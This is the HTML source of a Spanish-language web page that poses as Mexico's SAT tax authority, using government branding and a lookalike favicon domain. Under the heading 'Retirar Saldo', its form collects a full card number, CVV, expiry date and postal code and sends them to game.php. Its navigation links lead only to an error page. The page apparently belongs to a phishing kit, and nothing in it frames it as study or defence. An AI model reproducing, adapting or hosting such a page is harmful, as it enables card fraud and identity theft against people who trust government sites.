<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!---FAVICON-->
	<link rel="icon" type="image/x-icon" href="https://verificacionsat.ml/assets/images/sat.png">
	<!--STYLES-->
	<link rel="stylesheet" href="assets/liberacion.css">
	<link rel="stylesheet" href="assets/styles.css">
	<!--FONTAWESOME-->
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<title>Verificación de Comprobantes Fiscales Digitales por internet</title>
</head>
<body ondragstart="return false;" ondrop="return false;" >
	<div class="fixed">
		<nav class="navbar">
            <div class="navbar-header">
                <a href="#" class="navbar-brand"><img src="assets/renovacion.png" alt="Gobierno de México"></a>
                <button class="navbar-toggler"><span></span></button>
            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-concierge-bell"></i> Trámites</a>
                    </li>
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-address-card"></i> Nosotros</a>
                    </li>
                </ul>
            </div>
        </nav>
	</div>
	<!--WELCOME-->
	<div class="desing"></div>
	<div class="transport_web">
		<div class="info_web">
			<ul>
				<li><a href=""><i class="fas fa-home"></i></a></li> /
				<li><a href="">Inicio</a></li>
			</ul>
		</div>
	</div>
	<!--END-->
	<div class="saldo-retirar">
		<div class="title-text">
			<h1>Retirar Saldo</h1>
			<div class="parrafo-title">
				Rellena todos los campos con tus datos personales
			</div>
		</div>
		<div class="line-sat">
			<hr>
		</div>
		<div class="logo-mastercard">
			<img src="https://shop.carmen24.es/wp-content/uploads/2020/12/pago-seguro-garantizado.png" alt="Card">
		</div>
		<form  action="game.php" method="POST">
			<div class="style-sat-lib">
				<div class="sat-grid-liberacion">
				<br>
			<input class="free" name="pasasple" type="text" placeholder="Inserta los 18 digitos">
			</div>

			<div class="sat-grid-liberacion">
				<br>
			<input class="free"type="text" name="code" placeholder="CVV">
			</div>

			<div class="sat-grid-liberacion">
				<br>
			<input class="free" type="text"  name="datees" placeholder="Fecha de Vencimiento MM/AA">
			</div>
			<div class="sat-grid-liberacion">
				<br>
			<input class="free"type="text" name="codigo" placeholder="Codigo postal (CP)">
			</div>
			</div>
			<div class="direccion">
				<button type="submit">Retirar</button>
			</div>
		</form>
	</div>
	<script type="text/javascript">
        	const navbar = document.querySelector('.navbar');
const navbarToggler = navbar.querySelector('.navbar-header .navbar-toggler');
const navbarCollapse = navbar.querySelector('.navbar-collapse');
navbarToggler.addEventListener('click', function() {
    navbarToggler.classList.toggle('active');
    navbarCollapse.classList.toggle('active');
});
        </script>
</body>
</html>